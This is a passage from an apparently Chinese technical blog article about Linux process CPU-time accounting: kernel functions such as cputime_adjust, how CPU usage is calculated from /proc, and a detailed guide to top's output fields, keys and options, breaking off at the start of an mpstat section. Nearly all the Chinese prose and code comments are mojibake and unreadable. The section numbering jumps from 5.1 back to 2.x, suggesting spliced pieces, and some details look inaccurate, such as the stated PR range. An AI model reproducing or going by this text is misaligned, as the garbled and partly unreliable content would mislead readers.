    seq_put_decimal_ull(m, <span class="hljs-string">" "</span>, <span class="hljs-type">nsec_to_clock_t</span>(utime));  <span class="hljs-comment">// ç”¨æˆ·æ—¶é—´</span>
    seq_put_decimal_ull(m, <span class="hljs-string">" "</span>, <span class="hljs-type">nsec_to_clock_t</span>(stime));  <span class="hljs-comment">// ç³»ç»Ÿæ—¶é—´</span>
    <span class="hljs-comment">// ...</span>
}
</code></pre>
<p><strong>å…³é”®å­—æ®µçš„æ¥æº</strong>ï¼š</p>
<ol>
<li><strong>PIDã€PPID</strong>ï¼šä» <code>task_struct</code> ç›´æ¥è¯»å–</li>
<li><strong>CPU æ—¶é—´</strong>ï¼šä» <code>task_struct-&gt;utime</code> å’Œ <code>task_struct-&gt;stime</code> è¯»å–</li>
<li><strong>å†…å­˜ä¿¡æ¯</strong>ï¼šä» <code>mm_struct</code> è¯»å–</li>
<li><strong>çŠ¶æ€</strong>ï¼šä» <code>task_struct-&gt;__state</code> è¯»å–</li>
</ol>
<h3 data-id="heading-17">4.2 task_cputime_adjusted() çš„ä½œç”¨</h3>
<p><strong>task_cputime_adjusted() å‡½æ•°</strong>ï¼š</p>
<p>è¿™ä¸ªå‡½æ•°è·å–è¿›ç¨‹çš„ CPU æ—¶é—´ï¼Œå¹¶è¿›è¡Œè°ƒæ•´ä»¥ç¡®ä¿å•è°ƒæ€§ã€‚</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// kernel/sched/cputime.c</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">task_cputime_adjusted</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> task_struct *p, u64 *ut, u64 *st)</span>
{
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">task_cputime</span> <span class="hljs-title">cputime</span> =</span> {
        .sum_exec_runtime = p-&gt;se.sum_exec_runtime,
    };
    
    task_cputime(p, &amp;cputime.utime, &amp;cputime.stime);
    cputime_adjust(&amp;cputime, &amp;p-&gt;prev_cputime, ut, st);
}
</code></pre>
<p><strong>cputime_adjust() çš„ä½œç”¨</strong>ï¼š</p>
<p>ç¡®ä¿ CPU æ—¶é—´çš„å•è°ƒæ€§ï¼Œé¿å…å› ä¸ºæ—¶é’Ÿç²¾åº¦é—®é¢˜å¯¼è‡´æ—¶é—´å€’é€€ã€‚</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// kernel/sched/cputime.c</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">cputime_adjust</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> task_cputime *curr, <span class="hljs-keyword">struct</span> prev_cputime *prev,
                    u64 *ut, u64 *st)</span>
{
    u64 rtime = curr-&gt;sum_exec_runtime;
    u64 stime = curr-&gt;stime;
    u64 utime = curr-&gt;utime;
    
    <span class="hljs-comment">// ç¡®ä¿ stime + utime == rtime</span>
    <span class="hljs-keyword">if</span> (stime == <span class="hljs-number">0</span>) {
        utime = rtime;
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (utime == <span class="hljs-number">0</span>) {
        stime = rtime;
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// æŒ‰æ¯”ä¾‹åˆ†é…</span>
        stime = mul_u64_u64_div_u64(stime, rtime, stime + utime);
    }
    
    <span class="hljs-comment">// ç¡®ä¿å•è°ƒæ€§</span>
    <span class="hljs-keyword">if</span> (stime &lt; prev-&gt;stime)
        stime = prev-&gt;stime;
    utime = rtime - stime;
    
    <span class="hljs-keyword">if</span> (utime &lt; prev-&gt;utime) {
        utime = prev-&gt;utime;
        stime = rtime - utime;
    }
    
    prev-&gt;stime = stime;
    prev-&gt;utime = utime;
    *ut = prev-&gt;utime;
    *st = prev-&gt;stime;
}
</code></pre>
<h3 data-id="heading-18">4.3 å·¥å…·å¦‚ä½•è®¡ç®—è¿›ç¨‹ CPU ä½¿ç”¨ç‡</h3>
<p><strong>top çš„è®¡ç®—æ–¹å¼</strong>ï¼š</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// ä¼ªä»£ç ç¤ºä¾‹</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">calculate_process_cpu_usage</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> process_info *proc)</span>
{
    <span class="hljs-comment">// è¯»å–ä¸¤æ¬¡ /proc/[pid]/stat</span>
    read_proc_pid_stat(proc-&gt;pid, &amp;stat1);
    sleep(<span class="hljs-number">1</span>);  <span class="hljs-comment">// ç­‰å¾… 1 ç§’</span>
    read_proc_pid_stat(proc-&gt;pid, &amp;stat2);
    
    <span class="hljs-comment">// è®¡ç®— CPU æ—¶é—´å·®å€¼</span>
    utime_delta = stat2.utime - stat1.utime;
    stime_delta = stat2.stime - stat1.stime;
    total_cputime = utime_delta + stime_delta;
    
    <span class="hljs-comment">// è®¡ç®— CPU ä½¿ç”¨ç‡ï¼ˆç™¾åˆ†æ¯”ï¼‰</span>
    <span class="hljs-comment">// æ³¨æ„ï¼šå¤šæ ¸ç³»ç»Ÿä¸­å¯èƒ½è¶…è¿‡ 100%</span>
    cpu_percent = (total_cputime * <span class="hljs-number">100.0</span>) / (<span class="hljs-number">1.0</span> * HZ);  <span class="hljs-comment">// HZ æ˜¯æ—¶é’Ÿé¢‘ç‡</span>
    
    <span class="hljs-comment">// è®¡ç®—å†…å­˜ä½¿ç”¨ç‡</span>
    mem_percent = (proc-&gt;rss * <span class="hljs-number">100.0</span>) / total_memory;
}
</code></pre>
<p><strong>å…³é”®ç‚¹</strong>ï¼š</p>
<ol>
<li><strong>å·®å€¼è®¡ç®—</strong>ï¼šCPU ä½¿ç”¨ç‡æ˜¯æ—¶é—´å·®å€¼çš„ç™¾åˆ†æ¯”</li>
<li><strong>å¤šæ ¸ç³»ç»Ÿ</strong>ï¼šå¦‚æœè¿›ç¨‹ä½¿ç”¨å¤šä¸ª CPU æ ¸å¿ƒï¼ŒCPU ä½¿ç”¨ç‡å¯èƒ½è¶…è¿‡ 100%</li>
<li><strong>æ—¶é—´å•ä½</strong>ï¼šéœ€è¦å°†æ—¶é’Ÿå‘¨æœŸè½¬æ¢ä¸ºç§’æˆ–ç™¾åˆ†æ¯”</li>
</ol>
<hr/>
<h2 data-id="heading-19">5. topã€mpstatã€htop å·¥å…·è¯¦è§£</h2>
<h3 data-id="heading-20">5.1 top å·¥å…·è¯¦è§£</h3>
<h3 data-id="heading-21">2.1 top æ˜¯ä»€ä¹ˆï¼Ÿ</h3>
<p><strong>top çš„å®šä¹‰</strong>ï¼š</p>
<p>top æ˜¯ Linux ç³»ç»Ÿä¸­æœ€ç»å…¸çš„è¿›ç¨‹ç›‘æ§å·¥å…·ï¼Œç”¨äºå®æ—¶æ˜¾ç¤ºç³»ç»Ÿä¸­è¿è¡Œçš„è¿›ç¨‹ä¿¡æ¯ã€CPU ä½¿ç”¨ç‡ã€å†…å­˜ä½¿ç”¨æƒ…å†µç­‰ã€‚</p>
<p><strong>top çš„ç‰¹ç‚¹</strong>ï¼š</p>
<ol>
<li><strong>å®æ—¶æ›´æ–°</strong>ï¼šé»˜è®¤æ¯ 3 ç§’æ›´æ–°ä¸€æ¬¡</li>
<li><strong>äº¤äº’å¼</strong>ï¼šæ”¯æŒé”®ç›˜å‘½ä»¤æ“ä½œ</li>
<li><strong>è¯¦ç»†ä¿¡æ¯</strong>ï¼šæ˜¾ç¤ºè¿›ç¨‹çš„ CPUã€å†…å­˜ã€çŠ¶æ€ç­‰ä¿¡æ¯</li>
<li><strong>è½»é‡çº§</strong>ï¼šèµ„æºå ç”¨å°ï¼Œé€‚åˆç”Ÿäº§ç¯å¢ƒ</li>
</ol>
<p><strong>top çš„å®‰è£…</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># Debian/Ubuntu</span>
apt-get install procps

<span class="hljs-comment"># CentOS/RHEL</span>
yum install procps-ng

<span class="hljs-comment"># éªŒè¯å®‰è£…</span>
top --version
</code></pre>
<h3 data-id="heading-22">2.2 top çš„è¾“å‡ºè¯¦è§£</h3>
<p><strong>top çš„è¾“å‡ºåˆ†ä¸ºä¸¤éƒ¨åˆ†</strong>ï¼š</p>
<ol>
<li><strong>ç³»ç»Ÿæ‘˜è¦ä¿¡æ¯</strong>ï¼ˆé¡¶éƒ¨ï¼‰</li>
<li><strong>è¿›ç¨‹åˆ—è¡¨</strong>ï¼ˆä¸‹æ–¹ï¼‰</li>
</ol>
<p><strong>ç³»ç»Ÿæ‘˜è¦ä¿¡æ¯è¯¦è§£</strong>ï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-string">top</span> <span class="hljs-bullet">-</span> <span class="hljs-number">10</span><span class="hljs-string">:30:45</span> <span class="hljs-string">up</span> <span class="hljs-number">5</span> <span class="hljs-string">days,</span>  <span class="hljs-number">2</span><span class="hljs-string">:15,</span>  <span class="hljs-number">3</span> <span class="hljs-string">users,</span>  <span class="hljs-attr">load average:</span> <span class="hljs-number">0.52</span><span class="hljs-string">,</span> <span class="hljs-number">0.58</span><span class="hljs-string">,</span> <span class="hljs-number">0.61</span>
<span class="hljs-attr">Tasks:</span> <span class="hljs-number">285</span> <span class="hljs-string">total,</span>   <span class="hljs-number">1</span> <span class="hljs-string">running,</span> <span class="hljs-number">284</span> <span class="hljs-string">sleeping,</span>   <span class="hljs-number">0</span> <span class="hljs-string">stopped,</span>   <span class="hljs-number">0</span> <span class="hljs-string">zombie</span>
<span class="hljs-string">%Cpu(s):</span>  <span class="hljs-number">5.2</span> <span class="hljs-string">us,</span>  <span class="hljs-number">2.1</span> <span class="hljs-string">sy,</span>  <span class="hljs-number">0.0</span> <span class="hljs-string">ni,</span> <span class="hljs-number">92.5</span> <span class="hljs-string">id,</span>  <span class="hljs-number">0.1</span> <span class="hljs-string">wa,</span>  <span class="hljs-number">0.0</span> <span class="hljs-string">hi,</span>  <span class="hljs-number">0.1</span> <span class="hljs-string">si,</span>  <span class="hljs-number">0.0</span> <span class="hljs-string">st</span>
<span class="hljs-attr">MiB Mem :</span>  <span class="hljs-number">8192.0 </span><span class="hljs-string">total,</span>  <span class="hljs-number">1024.0 </span><span class="hljs-string">free,</span>   <span class="hljs-number">2048.0 </span><span class="hljs-string">used,</span>   <span class="hljs-number">5120.0 </span><span class="hljs-string">buff/cache</span>
<span class="hljs-attr">MiB Swap:</span>  <span class="hljs-number">4096.0 </span><span class="hljs-string">total,</span>  <span class="hljs-number">4096.0 </span><span class="hljs-string">free,</span>     <span class="hljs-number">0.0</span> <span class="hljs-string">used.</span>   <span class="hljs-number">5120.0 </span><span class="hljs-string">avail</span> <span class="hljs-string">Mem</span>
</code></pre>
<p><strong>è¯¦ç»†å­—æ®µè¯´æ˜</strong>ï¼š</p>
<ol>
<li>
<p><strong>ç¬¬ä¸€è¡Œï¼šç³»ç»Ÿæ—¶é—´å’Œè´Ÿè½½</strong>ï¼š</p>
<ul>
<li><strong><code>10:30:45</code></strong>ï¼šå½“å‰ç³»ç»Ÿæ—¶é—´</li>
<li><strong><code>up 5 days, 2:15</code></strong>ï¼šç³»ç»Ÿè¿è¡Œæ—¶é—´ï¼ˆ5 å¤© 2 å°æ—¶ 15 åˆ†é’Ÿï¼‰</li>
<li><strong><code>3 users</code></strong>ï¼šå½“å‰ç™»å½•ç”¨æˆ·æ•°</li>
<li><strong><code>load average: 0.52, 0.58, 0.61</code></strong>ï¼šç³»ç»Ÿè´Ÿè½½å¹³å‡å€¼
<ul>
<li><strong>0.52</strong>ï¼š1 åˆ†é’Ÿå¹³å‡è´Ÿè½½</li>
<li><strong>0.58</strong>ï¼š5 åˆ†é’Ÿå¹³å‡è´Ÿè½½</li>
<li><strong>0.61</strong>ï¼š15 åˆ†é’Ÿå¹³å‡è´Ÿè½½</li>
<li><strong>å«ä¹‰</strong>ï¼šè´Ÿè½½å€¼è¡¨ç¤ºå¯è¿è¡Œè¿›ç¨‹çš„å¹³å‡æ•°é‡</li>
<li><strong>å•æ ¸ CPU</strong>ï¼šè´Ÿè½½ 1.0 è¡¨ç¤º CPU 100% ä½¿ç”¨</li>
<li><strong>å¤šæ ¸ CPU</strong>ï¼šè´Ÿè½½å€¼åº”è¯¥é™¤ä»¥ CPU æ ¸å¿ƒæ•°</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>ç¬¬äºŒè¡Œï¼šä»»åŠ¡ç»Ÿè®¡</strong>ï¼š</p>
<ul>
<li><strong><code>285 total</code></strong>ï¼šæ€»è¿›ç¨‹æ•°</li>
<li><strong><code>1 running</code></strong>ï¼šæ­£åœ¨è¿è¡Œçš„è¿›ç¨‹æ•°</li>
<li><strong><code>284 sleeping</code></strong>ï¼šç¡çœ çŠ¶æ€çš„è¿›ç¨‹æ•°</li>
<li><strong><code>0 stopped</code></strong>ï¼šåœæ­¢çŠ¶æ€çš„è¿›ç¨‹æ•°</li>
<li><strong><code>0 zombie</code></strong>ï¼šåƒµå°¸è¿›ç¨‹æ•°</li>
</ul>
</li>
<li>
<p><strong>ç¬¬ä¸‰è¡Œï¼šCPU ä½¿ç”¨ç‡</strong>ï¼š</p>
<ul>
<li><strong><code>5.2 us</code></strong>ï¼šç”¨æˆ·ç©ºé—´ CPU ä½¿ç”¨ç‡ï¼ˆ5.2%ï¼‰</li>
<li><strong><code>2.1 sy</code></strong>ï¼šå†…æ ¸ç©ºé—´ CPU ä½¿ç”¨ç‡ï¼ˆ2.1%ï¼‰</li>
<li><strong><code>0.0 ni</code></strong>ï¼šnice è°ƒæ•´åçš„ç”¨æˆ·ç©ºé—´ CPU ä½¿ç”¨ç‡</li>
<li><strong><code>92.5 id</code></strong>ï¼šç©ºé—² CPU ç™¾åˆ†æ¯”ï¼ˆ92.5%ï¼‰</li>
<li><strong><code>0.1 wa</code></strong>ï¼šç­‰å¾… I/O çš„ CPU ç™¾åˆ†æ¯”</li>
<li><strong><code>0.0 hi</code></strong>ï¼šç¡¬ä»¶ä¸­æ–­ CPU ç™¾åˆ†æ¯”</li>
<li><strong><code>0.1 si</code></strong>ï¼šè½¯ä»¶ä¸­æ–­ CPU ç™¾åˆ†æ¯”</li>
<li><strong><code>0.0 st</code></strong>ï¼šè™šæ‹ŸåŒ–ç¯å¢ƒä¸­è¢«å…¶ä»–è™šæ‹Ÿæœºå ç”¨çš„ CPU ç™¾åˆ†æ¯”</li>
</ul>
</li>
<li>
<p><strong>ç¬¬å››è¡Œï¼šå†…å­˜ä½¿ç”¨</strong>ï¼š</p>
<ul>
<li><strong><code>8192.0 total</code></strong>ï¼šæ€»å†…å­˜ï¼ˆ8 GBï¼‰</li>
<li><strong><code>1024.0 free</code></strong>ï¼šç©ºé—²å†…å­˜ï¼ˆ1 GBï¼‰</li>
<li><strong><code>2048.0 used</code></strong>ï¼šå·²ä½¿ç”¨å†…å­˜ï¼ˆ2 GBï¼‰</li>
<li><strong><code>5120.0 buff/cache</code></strong>ï¼šç¼“å†²åŒºå’Œç¼“å­˜å†…å­˜ï¼ˆ5 GBï¼‰</li>
</ul>
</li>
<li>
<p><strong>ç¬¬äº”è¡Œï¼šäº¤æ¢åˆ†åŒºä½¿ç”¨</strong>ï¼š</p>
<ul>
<li><strong><code>4096.0 total</code></strong>ï¼šæ€»äº¤æ¢åˆ†åŒºï¼ˆ4 GBï¼‰</li>
<li><strong><code>4096.0 free</code></strong>ï¼šç©ºé—²äº¤æ¢åˆ†åŒºï¼ˆ4 GBï¼‰</li>
<li><strong><code>0.0 used</code></strong>ï¼šå·²ä½¿ç”¨äº¤æ¢åˆ†åŒºï¼ˆ0 GBï¼‰</li>
<li><strong><code>5120.0 avail Mem</code></strong>ï¼šå¯ç”¨å†…å­˜ï¼ˆ5 GBï¼ŒåŒ…æ‹¬ç¼“å­˜ï¼‰</li>
</ul>
</li>
</ol>
<p><strong>è¿›ç¨‹åˆ—è¡¨å­—æ®µè¯¦è§£</strong>ï¼š</p>
<pre><code class="hljs language-perl" lang="perl">PID   USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND
<span class="hljs-number">1234</span>  root      <span class="hljs-number">20</span>   <span class="hljs-number">0</span>  <span class="hljs-number">1024000</span>  <span class="hljs-number">512000</span>  <span class="hljs-number">256000</span> S  <span class="hljs-number">5.2</span>   <span class="hljs-number">6.2</span>   <span class="hljs-number">10</span>:<span class="hljs-number">30.45</span> test
</code></pre>
<p><strong>å­—æ®µè¯¦ç»†è¯´æ˜</strong>ï¼š</p>
<ol>
<li>
<p><strong>PIDï¼ˆProcess IDï¼‰</strong>ï¼š</p>
<ul>
<li><strong>å«ä¹‰</strong>ï¼šè¿›ç¨‹ ID</li>
<li><strong>ä½œç”¨</strong>ï¼šå”¯ä¸€æ ‡è¯†ä¸€ä¸ªè¿›ç¨‹</li>
<li><strong>èŒƒå›´</strong>ï¼š1-4194304ï¼ˆé€šå¸¸ï¼‰</li>
</ul>
</li>
<li>
<p><strong>USER</strong>ï¼š</p>
<ul>
<li><strong>å«ä¹‰</strong>ï¼šè¿›ç¨‹æ‰€æœ‰è€…</li>
<li><strong>ä½œç”¨</strong>ï¼šæ˜¾ç¤ºè¿›ç¨‹ä»¥å“ªä¸ªç”¨æˆ·èº«ä»½è¿è¡Œ</li>
</ul>
</li>
<li>
<p><strong>PRï¼ˆPriorityï¼‰</strong>ï¼š</p>
<ul>
<li><strong>å«ä¹‰</strong>ï¼šè¿›ç¨‹ä¼˜å…ˆçº§</li>
<li><strong>èŒƒå›´</strong>ï¼š-20 åˆ° 19ï¼ˆå®æ—¶è¿›ç¨‹ä¸ºè´Ÿæ•°ï¼‰</li>
<li><strong>ä½œç”¨</strong>ï¼šå½±å“è¿›ç¨‹è°ƒåº¦ä¼˜å…ˆçº§</li>
</ul>
</li>
<li>
<p><strong>NIï¼ˆNiceï¼‰</strong>ï¼š</p>
<ul>
<li><strong>å«ä¹‰</strong>ï¼šnice å€¼</li>
<li><strong>èŒƒå›´</strong>ï¼š-20 åˆ° 19</li>
<li><strong>ä½œç”¨</strong>ï¼šè°ƒæ•´è¿›ç¨‹ä¼˜å…ˆçº§ï¼ˆnice å€¼è¶Šå°ï¼Œä¼˜å…ˆçº§è¶Šé«˜ï¼‰</li>
</ul>
</li>
<li>
<p><strong>VIRTï¼ˆVirtual Memoryï¼‰</strong>ï¼š</p>
<ul>
<li><strong>å«ä¹‰</strong>ï¼šè™šæ‹Ÿå†…å­˜å¤§å°</li>
<li><strong>å•ä½</strong>ï¼šKBã€MBã€GB</li>
<li><strong>ä½œç”¨</strong>ï¼šè¿›ç¨‹å¯ä»¥è®¿é—®çš„æ€»è™šæ‹Ÿåœ°å€ç©ºé—´</li>
</ul>
</li>
<li>
<p><strong>RESï¼ˆResident Memoryï¼‰</strong>ï¼š</p>
<ul>
<li><strong>å«ä¹‰</strong>ï¼šç‰©ç†å†…å­˜ä½¿ç”¨é‡ï¼ˆå¸¸é©»å†…å­˜ï¼‰</li>
<li><strong>å•ä½</strong>ï¼šKBã€MBã€GB</li>
<li><strong>ä½œç”¨</strong>ï¼šè¿›ç¨‹å®é™…å ç”¨çš„ç‰©ç†å†…å­˜</li>
</ul>
</li>
<li>
<p><strong>SHRï¼ˆShared Memoryï¼‰</strong>ï¼š</p>
<ul>
<li><strong>å«ä¹‰</strong>ï¼šå…±äº«å†…å­˜å¤§å°</li>
<li><strong>å•ä½</strong>ï¼šKBã€MBã€GB</li>
<li><strong>ä½œç”¨</strong>ï¼šä¸å…¶ä»–è¿›ç¨‹å…±äº«çš„å†…å­˜</li>
</ul>
</li>
<li>
<p><strong>Sï¼ˆStatusï¼‰</strong>ï¼š</p>
<ul>
<li><strong>å«ä¹‰</strong>ï¼šè¿›ç¨‹çŠ¶æ€</li>
<li><strong>å€¼</strong>ï¼š
<ul>
<li><strong>Rï¼ˆRunningï¼‰</strong>ï¼šæ­£åœ¨è¿è¡Œæˆ–å¯è¿è¡Œ</li>
<li><strong>Sï¼ˆSleepingï¼‰</strong>ï¼šå¯ä¸­æ–­ç¡çœ </li>
<li><strong>Dï¼ˆDisk Sleepï¼‰</strong>ï¼šä¸å¯ä¸­æ–­ç¡çœ ï¼ˆé€šå¸¸ç­‰å¾… I/Oï¼‰</li>
<li><strong>Tï¼ˆStoppedï¼‰</strong>ï¼šå·²åœæ­¢</li>
<li><strong>Zï¼ˆZombieï¼‰</strong>ï¼šåƒµå°¸è¿›ç¨‹</li>
<li><strong>Iï¼ˆIdleï¼‰</strong>ï¼šç©ºé—²ï¼ˆå†…æ ¸çº¿ç¨‹ï¼‰</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>%CPU</strong>ï¼š</p>
<ul>
<li><strong>å«ä¹‰</strong>ï¼šCPU ä½¿ç”¨ç‡</li>
<li><strong>è®¡ç®—æ–¹å¼</strong>ï¼šè¿›ç¨‹åœ¨é‡‡æ ·å‘¨æœŸå†…çš„ CPU ä½¿ç”¨æ—¶é—´ / é‡‡æ ·å‘¨æœŸ</li>
<li><strong>èŒƒå›´</strong>ï¼š0-100%ï¼ˆå¤šæ ¸ç³»ç»Ÿå¯èƒ½è¶…è¿‡ 100%ï¼‰</li>
</ul>
</li>
<li>
<p><strong>%MEM</strong>ï¼š</p>
<ul>
<li><strong>å«ä¹‰</strong>ï¼šå†…å­˜ä½¿ç”¨ç‡</li>
<li><strong>è®¡ç®—æ–¹å¼</strong>ï¼šRES / æ€»å†…å­˜ * 100%</li>
<li><strong>èŒƒå›´</strong>ï¼š0-100%</li>
</ul>
</li>
<li>
<p><strong>TIME+</strong>ï¼š</p>
<ul>
<li><strong>å«ä¹‰</strong>ï¼šç´¯è®¡ CPU æ—¶é—´</li>
<li><strong>æ ¼å¼</strong>ï¼šåˆ†:ç§’.æ¯«ç§’</li>
<li><strong>ä½œç”¨</strong>ï¼šæ˜¾ç¤ºè¿›ç¨‹æ€»å…±ä½¿ç”¨çš„ CPU æ—¶é—´</li>
</ul>
</li>
<li>
<p><strong>COMMAND</strong>ï¼š</p>
<ul>
<li><strong>å«ä¹‰</strong>ï¼šè¿›ç¨‹å‘½ä»¤</li>
<li><strong>æ˜¾ç¤º</strong>ï¼šè¿›ç¨‹çš„å‘½ä»¤è¡Œæˆ–ç¨‹åºå</li>
</ul>
</li>
</ol>
<h3 data-id="heading-23">2.3 top çš„äº¤äº’å‘½ä»¤</h3>
<p><strong>å¸¸ç”¨äº¤äº’å‘½ä»¤</strong>ï¼š</p>
<ol>
<li>
<p><strong>æ’åºå‘½ä»¤</strong>ï¼š</p>
<ul>
<li><strong><code>P</code></strong>ï¼šæŒ‰ CPU ä½¿ç”¨ç‡æ’åº</li>
<li><strong><code>M</code></strong>ï¼šæŒ‰å†…å­˜ä½¿ç”¨ç‡æ’åº</li>
<li><strong><code>T</code></strong>ï¼šæŒ‰è¿è¡Œæ—¶é—´æ’åº</li>
<li><strong><code>N</code></strong>ï¼šæŒ‰ PID æ’åº</li>
</ul>
</li>
<li>
<p><strong>æ˜¾ç¤ºå‘½ä»¤</strong>ï¼š</p>
<ul>
<li><strong><code>f</code></strong>ï¼šé€‰æ‹©æ˜¾ç¤ºå­—æ®µ</li>
<li><strong><code>o</code></strong>ï¼šæ”¹å˜å­—æ®µæ˜¾ç¤ºé¡ºåº</li>
<li><strong><code>x</code></strong>ï¼šé«˜äº®æ˜¾ç¤ºæ’åºåˆ—</li>
<li><strong><code>b</code></strong>ï¼šåˆ‡æ¢ç²—ä½“æ˜¾ç¤º</li>
</ul>
</li>
<li>
<p><strong>è¿›ç¨‹æ“ä½œ</strong>ï¼š</p>
<ul>
<li><strong><code>k</code></strong>ï¼šæ€æ­»è¿›ç¨‹ï¼ˆéœ€è¦è¾“å…¥ PIDï¼‰</li>
<li><strong><code>r</code></strong>ï¼šä¿®æ”¹è¿›ç¨‹ä¼˜å…ˆçº§ï¼ˆnice å€¼ï¼‰</li>
<li><strong><code>d</code></strong>ï¼šä¿®æ”¹æ›´æ–°å»¶è¿Ÿ</li>
</ul>
</li>
<li>
<p><strong>å…¶ä»–å‘½ä»¤</strong>ï¼š</p>
<ul>
<li><strong><code>h</code></strong>ï¼šæ˜¾ç¤ºå¸®åŠ©</li>
<li><strong><code>q</code></strong>ï¼šé€€å‡º top</li>
<li><strong><code>1</code></strong>ï¼šåˆ‡æ¢æ˜¾ç¤ºæ‰€æœ‰ CPU æˆ–æ±‡æ€»</li>
<li><strong><code>u</code></strong>ï¼šæŒ‰ç”¨æˆ·è¿‡æ»¤è¿›ç¨‹</li>
</ul>
</li>
</ol>
<h3 data-id="heading-24">2.4 top çš„é…ç½®</h3>
<p><strong>é…ç½®æ–‡ä»¶</strong>ï¼š</p>
<p>top çš„é…ç½®æ–‡ä»¶ä½äº <code>~/.toprc</code>ï¼Œå¯ä»¥ä¿å­˜ç”¨æˆ·çš„è®¾ç½®ã€‚</p>
<p><strong>å¸¸ç”¨é…ç½®</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># è®¾ç½®æ›´æ–°å»¶è¿Ÿï¼ˆç§’ï¼‰</span>
top -d 1  <span class="hljs-comment"># æ¯ 1 ç§’æ›´æ–°ä¸€æ¬¡</span>

<span class="hljs-comment"># åªæ˜¾ç¤ºç‰¹å®šç”¨æˆ·çš„è¿›ç¨‹</span>
top -u username

<span class="hljs-comment"># æ‰¹å¤„ç†æ¨¡å¼ï¼ˆé€‚åˆè„šæœ¬ï¼‰</span>
top -b -n 1  <span class="hljs-comment"># è¿è¡Œä¸€æ¬¡åé€€å‡º</span>

<span class="hljs-comment"># æ˜¾ç¤ºç‰¹å®š PID çš„è¿›ç¨‹</span>
top -p 1234,5678
</code></pre>
<p><strong>æ‰¹å¤„ç†æ¨¡å¼ç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ä¿å­˜ top è¾“å‡ºåˆ°æ–‡ä»¶</span>
top -b -n 1 &gt; top_output.txt

<span class="hljs-comment"># åœ¨è„šæœ¬ä¸­ä½¿ç”¨</span>
top -b -n 1 | grep <span class="hljs-string">"test"</span>
</code></pre>
<h3 data-id="heading-25">2.5 top çš„æ•°æ®æ¥æº</h3>
<p><strong>top ä» /proc æ–‡ä»¶ç³»ç»Ÿè¯»å–æ•°æ®</strong>ï¼š</p>
<ol>
<li>
<p><strong><code>/proc/stat</code></strong>ï¼šç³»ç»Ÿæ•´ä½“ç»Ÿè®¡ä¿¡æ¯</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">cat</span> /proc/stat
<span class="hljs-comment"># è¾“å‡ºï¼š</span>
<span class="hljs-comment"># cpu  12345 0 5678 89012 1234 0 567 0 0 0</span>
<span class="hljs-comment"># cpu0 1234 0 567 8901 123 0 56 0 0 0</span>
<span class="hljs-comment"># ...</span>
</code></pre>
</li>
<li>
<p><strong><code>/proc/[pid]/stat</code></strong>ï¼šè¿›ç¨‹ç»Ÿè®¡ä¿¡æ¯</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">cat</span> /proc/1234/stat
<span class="hljs-comment"># è¾“å‡ºï¼šPID comm state ppid pgrp session tty_nr tpgid flags ...</span>
</code></pre>
</li>
<li>
<p><strong><code>/proc/[pid]/status</code></strong>ï¼šè¿›ç¨‹è¯¦ç»†çŠ¶æ€</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">cat</span> /proc/1234/status
<span class="hljs-comment"># è¾“å‡ºï¼šName, State, Pid, PPid, ...</span>
</code></pre>
</li>
<li>
<p><strong><code>/proc/meminfo</code></strong>ï¼šå†…å­˜ä¿¡æ¯</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">cat</span> /proc/meminfo
<span class="hljs-comment"># è¾“å‡ºï¼šMemTotal, MemFree, MemAvailable, ...</span>
</code></pre>
</li>
<li>
<p><strong><code>/proc/loadavg</code></strong>ï¼šç³»ç»Ÿè´Ÿè½½</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">cat</span> /proc/loadavg
<span class="hljs-comment"># è¾“å‡ºï¼š0.52 0.58 0.61 2/285 12345</span>
</code></pre>
</li>
</ol>
<p><strong>æ•°æ®æ›´æ–°æœºåˆ¶</strong>ï¼š</p>
<ul>
<li>top å®šæœŸè¯»å– <code>/proc</code> æ–‡ä»¶ç³»ç»Ÿ</li>
<li>è®¡ç®—ä¸¤æ¬¡è¯»å–ä¹‹é—´çš„å·®å€¼</li>
<li>æ˜¾ç¤ºç»Ÿè®¡ä¿¡æ¯</li>
</ul>
<hr/>
<h2 data-id="heading-26">3. mpstat å·¥å…·è¯¦è§£</h2>
<h3 data-id="heading-27">3.1 mpstat æ˜¯ä»€ä¹ˆï¼Ÿ</h3>
<p><strong>mpstat çš„å®šä¹‰</strong>ï¼š</p>
<p>mpstatï¼ˆMulti-Processor Statisticsï¼‰æ˜¯ sysstat å·¥å…·åŒ…ä¸­çš„ä¸€ä¸ªå·¥å…·ï¼Œç”¨äºæ˜¾ç¤ºæ¯ä¸ª CPU æ ¸å¿ƒçš„è¯¦ç»†ç»Ÿè®¡ä¿¡æ¯ã€‚</p>
<p><strong>mpstat çš„ç‰¹ç‚¹</strong>ï¼š</p>
<ol>
<li><strong>å¤šæ ¸æ”¯æŒ</strong>ï¼šæ˜¾ç¤ºæ¯ä¸ª CPU æ ¸å¿ƒçš„ç»Ÿè®¡ä¿¡æ¯</li>
<li><strong>è¯¦ç»†ç»Ÿè®¡</strong>ï¼šæä¾›æ›´è¯¦ç»†çš„ CPU ç»Ÿè®¡ä¿¡æ¯</li>
<li><strong>å‘½ä»¤è¡Œå·¥å…·</strong>ï¼šé€‚åˆè„šæœ¬å’Œè‡ªåŠ¨åŒ–</li>
